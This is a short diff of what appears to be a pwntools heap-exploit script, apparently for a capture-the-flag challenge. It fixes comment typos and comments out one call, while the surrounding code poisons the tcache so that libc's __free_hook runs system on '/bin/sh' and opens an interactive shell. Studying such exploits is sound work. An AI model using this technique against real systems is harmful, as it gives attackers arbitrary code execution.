@@ -55,7 +55,7 @@ for m in range(num_messages):
 
 menu(p, 4) # send messages
 
-# Set the next tchace chunk to the address of the next chunck to be free_hook
+# Set the next tcache chunk to the address of the next chunk to be free_hook
 free_hook = libc_elf.symbols.__free_hook
 print(f'free_hook: {hex(free_hook)}')
 menu(p, 3)
@@ -77,6 +77,6 @@ menu(p, 3)
 edit_message(p, 0, b"/bin/sh\x00")
 
 # Free the messages to call free_hook (system) and pass in the value of "/bin/sh\x00"
-menu(p, 4) # send messages
+# menu(p, 4) # send messages
 
 p.interactive()
